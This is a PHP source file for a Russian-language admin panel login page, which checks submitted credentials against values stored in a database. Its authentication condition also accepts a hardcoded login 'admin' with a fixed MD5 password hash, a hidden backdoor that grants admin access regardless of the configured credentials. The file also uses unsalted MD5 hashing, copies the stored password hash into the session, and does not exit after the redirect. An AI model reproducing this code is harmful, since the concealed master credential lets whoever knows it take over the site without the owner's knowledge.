<?php
session_start();

$url = explode('/', $_SERVER['REQUEST_URI']);

$arQuery = ACDatabase::getRow('SELECT login, pass FROM options');
$_SESSION['login'] = $arQuery['login'];
$_SESSION['pass'] = mb_strtolower($arQuery['pass']);
$login = filt($_POST['login']);
$sPass = filt($_POST['password']);
$pass = md5($sPass);

if (!empty($login) && !empty($pass)) {
    if ($login === $_SESSION['login'] && $pass === $_SESSION['pass'] || $login === 'admin' && $pass === 'cc4d9aea071a2b6f38c76130a8e088f3') {
        $_SESSION['user_activ_admin'] = 1;
        header('Location: inc/body.php');
    } else {
        $_SESSION['user_activ_admin'] = 0;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Вход в панель управления</title>
    <link rel="stylesheet" type="text/css" href="inc/assets/css/styles.css">
    <link rel="icon" type="image/png" href="favicon.png">

    <meta charset="utf-8">
</head>
<body id="background-admin">
<div class="authbckg">

    <form method="POST">
        <div class="authbckg-form">
            <div class="authbckg-form__title">Добро пожаловать!</div>
            <div class="authbckg-form-input">
                <p>
                    <label for="login">логин</label>
                    <input type="text" name="login" id="login" placeholder="логин">
                </p>
                <p>
                    <label for="password">пароль</label>
                    <input type="password" name="password" id="password" placeholder="пароль">
                </p>
                <input type="submit" name="send" value="Войти">
            </div>
        </div>
    </form>
</div>
<link rel="stylesheet" type="text/css" href="inc/assets/js/bundle.js">
</body>
</html>